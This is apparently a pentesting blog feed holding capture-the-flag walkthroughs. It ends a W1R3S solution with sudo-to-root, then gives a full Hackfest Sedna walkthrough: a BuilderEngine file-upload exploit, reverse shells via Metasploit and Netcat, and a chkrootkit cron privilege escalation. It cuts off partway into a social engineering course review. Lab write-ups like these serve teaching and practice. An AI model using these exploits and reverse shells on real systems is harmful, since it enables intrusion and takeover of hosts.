</span><span class='line'>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span><span class='line'>
</span><span class='line'>User w1r3s may run the following commands on W1R3S:
</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>That tops the misconfiguration list! Our user has unlimited sudo privileges!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>w1r3s@W1R3S:~$ sudo /bin/bash
</span><span class='line'>sudo: unable to resolve host W1R3S
</span><span class='line'>root@W1R3S:~# ls /root
</span><span class='line'>flag.txt
</span><span class='line'>root@W1R3S:~# cat /root/flag.txt
</span><span class='line'>-----------------------------------------------------------------------------------------
</span><span class='line'>   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
</span><span class='line'>  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
</span><span class='line'> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
</span><span class='line'> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
</span><span class='line'>  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>                          .-----------------TTTT_-----_______
</span><span class='line'>                        /''''''''''(______O] ----------____  \______/]_
</span><span class='line'>     __...---'"""\_ --''   Q                               ___________@
</span><span class='line'> |'''                   ._   _______________=---------"""""""
</span><span class='line'> |                ..--''|   l L |_l   |
</span><span class='line'> |          ..--''      .  /-___j '   '
</span><span class='line'> |    ..--''           /  ,       '   '
</span><span class='line'> |--''                /           `    \
</span><span class='line'>                      L__'         \    -
</span><span class='line'>                                    -    '-.
</span><span class='line'>                                     '.    /
</span><span class='line'>                                       '-./
</span><span class='line'>
</span><span class='line'>----------------------------------------------------------------------------------------
</span><span class='line'>  YOU HAVE COMPLETED THE
</span><span class='line'>               __      __  ______________________   _________
</span><span class='line'>              /  \    /  \/_   \______   \_____  \ /   _____/
</span><span class='line'>              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \
</span><span class='line'>               \        /  |   ||    |   \/       \/        \
</span><span class='line'>                \__/\  /   |___||____|_  /______  /_______  /.INC
</span><span class='line'>                     \/                \/       \/        \/        CHALLENGE, V 1.0
</span><span class='line'>----------------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>CREATED BY SpecterWires
</span><span class='line'>
</span><span class='line'>----------------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<h2>Phase 5: REPORT</h2>

<p>The exploitation chain was as follows:</p>

<ul>
<li>enumeration revealed the Cuppa CMS directories</li>
<li>Cuppa CMS was vulnerable to a LFI exploit</li>
<li>due to the CMS being configured as root, it was possible to read the <em>/etc/shadow</em> file with the LFI</li>
<li>hash was cracked for standard user <em>w1r3s</em></li>
<li>the user had unlimited sudo privileges and elevating to root was achieved</li>
</ul>


<p>Until next time!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_____________________________________
</span><span class='line'>/ You'll never be the man your mother \
</span><span class='line'>\ was!                                /
</span><span class='line'>-------------------------------------
</span><span class='line'>           \   ^__^
</span><span class='line'>              \  (oo)\_______
</span><span class='line'>                   (__)\       )\/\
</span><span class='line'>                           ||----w |
</span><span class='line'>                           ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Sedna]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/"/>
    <updated>2018-11-16T21:22:02+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna</id>
    <content type="html"><![CDATA[<p>This is another machine in the Hackfest 2016 series.</p>

<blockquote><p>There are 4 flags on this machine One for a shell One for root access Two for doing post
exploitation on Sedna</p></blockquote>

<p>Alrighty, let&rsquo;s hack the planet!</p>

<!-- more -->


<p>Plenty of open ports:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
</span><span class='line'>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
</span><span class='line'>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
</span><span class='line'>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.9.5-3-Ubuntu
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_Hackers
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>110/tcp   open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          48644/tcp  status
</span><span class='line'>|_  100024  1          58324/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp   open  imap        Dovecot imapd (Ubuntu)
</span><span class='line'>|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>993/tcp   open  ssl/imaps?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>995/tcp   open  ssl/pop3s?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat
</span><span class='line'>48644/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn&rsquo;t lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.145.128/
</span><span class='line'>
</span><span class='line'>=====================================================
</span><span class='line'>2018/11/16 14:56:38 Starting gobuster
</span><span class='line'>=====================================================
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/blocks (Status: 301)
</span><span class='line'>/files (Status: 301)
</span><span class='line'>/modules (Status: 301)
</span><span class='line'>/robots.txt (Status: 200)
</span><span class='line'>/server-status (Status: 403)
</span><span class='line'>/system (Status: 301)
</span><span class='line'>/themes (Status: 301)</span></code></pre></td></tr></table></div></figure>


<p>I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside <a href="http://192.168.145.128/themes/default_theme_2016/description.txt">http://192.168.145.128/themes/default_theme_2016/description.txt</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Default Theme 2016 for BuilderEngine V3.</span></code></pre></td></tr></table></div></figure>


<p>Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let&rsquo;s see both in action, starting with Metasploit!</p>

<h2>Low privilege shell &ndash; Metasploit</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>search builderengine
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                          Disclosure Date  Rank       Check  Description
</span><span class='line'>   ----                                          ---------------  ----       -----  -----------
</span><span class='line'>   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
</span><span class='line'>
</span><span class='line'>Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.145.128  yes       The target address
</span><span class='line'>   RPORT      80               yes       The target port (TCP)
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   TARGETURI  /                yes       The base path to BuilderEngine
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (php/meterpreter_reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
</span><span class='line'>   LPORT  8000             yes       The listen port</span></code></pre></td></tr></table></div></figure>


<p>Ran it and got a Meterpreter shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(multi/http/builderengine_upload_exec) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.145.133:8000 
</span><span class='line'>[+] Our payload is at: ppWvWjKRuV.php. Calling payload...
</span><span class='line'>[*] Calling payload...
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.145.133:8000 -&gt; 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
</span><span class='line'>[+] Deleted ppWvWjKRuV.php
</span><span class='line'>
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>The kernel is old, so plenty of privilege escalations should be available:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer    : Sedna
</span><span class='line'>OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
</span><span class='line'>Meterpreter : php/linux
</span><span class='line'>
</span><span class='line'>meterpreter &gt; cat /etc/lsb-release
</span><span class='line'>DISTRIB_ID=Ubuntu
</span><span class='line'>DISTRIB_RELEASE=14.04
</span><span class='line'>DISTRIB_CODENAME=trusty
</span><span class='line'>DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"</span></code></pre></td></tr></table></div></figure>


<p>I used Searchsploit to look for Ubuntu 14.04 exploits and went with the <a href="https://www.exploit-db.com/exploits/37292/">37292.c overlayfs exploit</a>/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; cat /var/www/flag.txt
</span><span class='line'>bfbb7e6e6e88d9ae66848b9aeac6b289</span></code></pre></td></tr></table></div></figure>


<p>Before continuing with rooting the machine, I went back getting a shell without Metasploit.</p>

<h2>Low privilege shell &ndash; manual</h2>

<p>Here&rsquo;s the ExploitDB variant of arbitrary file upload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat 40390.php 
</span><span class='line'>&lt;!-- 
</span><span class='line'># Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
</span><span class='line'># Date: 18/09/2016
</span><span class='line'># Exploit Author: metanubix
</span><span class='line'># Vendor Homepage: http://builderengine.org/
</span><span class='line'># Software Link: http://builderengine.org/page-cms-download.html
</span><span class='line'># Version: 3.5.0
</span><span class='line'># Tested on: Kali Linux 2.0 64 bit
</span><span class='line'># Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"
</span><span class='line'>
</span><span class='line'>1) Unauthenticated Unrestricted File Upload:
</span><span class='line'>
</span><span class='line'>  POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/
</span><span class='line'>
</span><span class='line'>  Vulnerable Parameter: files[]
</span><span class='line'>
</span><span class='line'>  We can upload test.php and reach the file via the following link:
</span><span class='line'>  /files/test.php
</span><span class='line'>--&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;
</span><span class='line'>  &lt;input type="file" name="files[]" /&gt;
</span><span class='line'>  &lt;input type="submit" value="send" /&gt;
</span><span class='line'>&lt;/form&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sedna/form.jpg" title="upload" alt="upload form"></p>

<p>Then I went to <a href="http://192.168.145.128/files/shell.php">http://192.168.145.128/files/shell.php</a> and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crackmeforpoints:x:1000:1000::/home/crackmeforpoints:</span></code></pre></td></tr></table></div></figure>


<p>Cracking the password for this user might be another flag, but first I need root. Since the exploits I&rsquo;ve tried so far didn&rsquo;t work, I decided to go down the <a href="https://www.exploit-db.com/exploits/40839/">dirtycow</a> route. Unfortunately, that didn&rsquo;t work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail.</p>

<h2>Getting root</h2>

<p>The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed <em>chkrootkit</em> was present. I searched for available exploits and found a privilege escalation one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>searchsploit chkrootkit
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'> Exploit Title                                                                   |  Path
</span><span class='line'>                                                                                 | (/usr/share/exploitdb/)
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'>Chkrootkit - Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
</span><span class='line'>Chkrootkit 0.49 - Local Privilege Escalation                                     | exploits/linux/local/33899.txt
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'>Shellcodes: No Result</span></code></pre></td></tr></table></div></figure>


<p>The exploit is available for version 0.49, so let&rsquo;s see what version is on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
</span><span class='line'>./chkrootkit -V
</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>


<p>Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called <em>update</em> with content of your choice in /tmp and wait for chkrootkit to run it as root.</p>

<p>Metasploit came through and finally, I got root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(unix/local/chkrootkit) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/local/chkrootkit):
</span><span class='line'>
</span><span class='line'>   Name        Current Setting       Required  Description
</span><span class='line'>   ----        ---------------       --------  -----------
</span><span class='line'>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
</span><span class='line'>   SESSION                           yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; set SESSION 1
</span><span class='line'>SESSION =&gt; 1
</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; run
</span><span class='line'>
</span><span class='line'>[!] SESSION may not be compatible with this module.
</span><span class='line'>[*] Started reverse TCP double handler on 192.168.145.133:4444 
</span><span class='line'>[!] Rooting depends on the crontab (this could take a while)
</span><span class='line'>[*] Payload written to /tmp/update
</span><span class='line'>[*] Waiting for chkrootkit to run via cron...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo EzISATvm3xKkw6bX;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "EzISATvm3xKkw6bX\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 2 opened (192.168.145.133:4444 -&gt; 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
</span><span class='line'>[+] Deleted /tmp/update
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Got the root flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /root/flag.txt
</span><span class='line'>a10828bee17db751de4b936614558305</span></code></pre></td></tr></table></div></figure>


<p>It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t want to crack the password for the 4th flag, so I decided to call it a day at &frac34; flags.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ I must have a prodigious quantity of  \
</span><span class='line'>| mind; it takes me as much as a week   |
</span><span class='line'>| sometimes to make it up.              |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain, "The Innocents Abroad" /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Social Engineering Expert course review]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/11/social-engineering-expert-course-review/"/>
    <updated>2018-11-11T13:17:57+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/11/social-engineering-expert-course-review</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve recently taken the <a href="https://redteam-training.thinkific.com/courses/social-engineering-expert">Social Engineering Expert</a> from <a href="https://www.redteamsecure.com/">RedTeam Security</a>. If you don&rsquo;t know about them, check out their articles and videos about their engagements, they&rsquo;re doing some really cool stuff. In this post I will share my impressions about the course.</p>

<!-- more -->


<p>First of all, the author of the course is also the founder of RedTeam Security, Jeremiah Talamantes. He&rsquo;s authored a book called <a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/ref=as_li_ss_tl?s=books&amp;ie=UTF8&amp;qid=1452290969&amp;sr=1-1&amp;keywords=social+engineers+playbook&amp;linkCode=sl1&amp;tag=talamantesus-20&amp;linkId=1f8b9cac92cdd16ae8d1956668d9942b">The Social Engineer’s Playbook: A Practical Guide to Pretexting</a>
, which I haven&rsquo;t tried yet. He is clearly very experienced and throughout the course, he&rsquo;s sharing various stories from the operations he&rsquo;s conducted.</p>

<p>The course is priced at 59$, but there are discounts every now and then. The training is video-based, where the instructor is sharing slides and talking about the topics. There are some valuable documents that can be downloaded, mainly templates and sample models for social engineering reports, plans and field notes guides. These can be used as starting points for your own operations.</p>

<p>As for the main structure of the course, it is as follows:</p>

<ul>
<li><p><strong>Introduction to social engineering</strong> &ndash; this covers the terminology around SE (it&rsquo;s getting tiring to type that) and goes through several examples</p></li>
<li><p><strong>Attack vectors</strong> &ndash; very useful section for actually conducting a SE campaign, it goes over different techniques and tools for social engineering your target, with actionable tips that you can use right away to enhance your operations. It also summarizes an attack in a very clear way, through the Social Engineering Kill Chain</p></li>
<li><p><strong>Methodology</strong> &ndash; this is another very practical section that covers planning and execution.</p></li>
<li><p><strong>Information gathering</strong> &ndash; physical and digital techniques for information gathering. There is a gear list for physical reconaissance that makes for a good reference. However, I found the digital side to be under-represented, only Maltego and Metagoofill are discussed. I would have expected at least a breakdown of the SET functionality, and more demos about OSINT and conducting phishing campaigns.</p></li>
<li><p><strong>Psychology &amp; manipulation</strong> &ndash; very applicable in day-to-day life, not limited to the field of security and SE, this describes various influencing and elicitation techniques that can be used to gain information or an expected behavior from a target. Not only that, but it also gives you awareness of such techniques being used on you.</p></li>
